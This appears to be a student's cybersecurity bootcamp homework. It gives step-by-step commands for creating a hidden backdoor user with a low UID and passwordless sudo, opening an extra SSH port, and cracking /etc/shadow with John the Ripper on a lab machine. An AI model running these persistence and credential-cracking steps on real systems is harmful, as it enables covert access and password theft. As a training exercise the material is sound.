## **Rachel Murphy**

April 3, 2021


## **Week 6 Homework Submission File: Advanced Bash - Owning the System**

**Step 1: Shadow People**

1. Create a secret user named sysd. Make sure this user doesn't have a home folder created: 

```sudo adduser --no-create-home sysd```

2. Give your secret user a password: hello

    *   Give your secret user a system UID &lt; 1000: ```usermod -u 555 sysd```
     
3. Give your secret user the same GID: ```groupmod -g 555 sysd```

4. Give your secret user full sudo access without the need for a password: ```visudo```

![image](https://user-images.githubusercontent.com/76081641/119245160-a8d69880-bb3c-11eb-9063-4f1e6f8d35e2.png)


5. Test that sudo access works without your password: 

![image](https://user-images.githubusercontent.com/76081641/119246439-2bfcec00-bb47-11eb-91d4-f1e50c9c8c5e.png)


**Step 2: Smooth Sailing**

1. Edit the sshd_config file: ```nano sshd_config```
2. Add port 2222 in the ```sshd_config``` file.

![image](https://user-images.githubusercontent.com/76081641/119246450-4afb7e00-bb47-11eb-932a-539c4c206fa4.png)

**Step 3: Testing Your Configuration Update**

1. Restart the SSH service: ```systemctl restart sshd```

2. Exit the root account: ```exit```

3. SSH to the target machine using your sysd account and port 2222: 

```ssh sysd@192.168.6.105 -p 2222```


4. Use sudo to switch to the root user: ```sudo su```


**Step 4: Crack All the Passwords**


1. SSH back to the system using your sysd account and port 2222: 

```ssh sysd@192.168.6.105 -p 2222```

2. Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file: 

  ``` john /etc/shadow```
![image](https://user-images.githubusercontent.com/76081641/119246475-8bf39280-bb47-11eb-922c-5aa117040942.png)
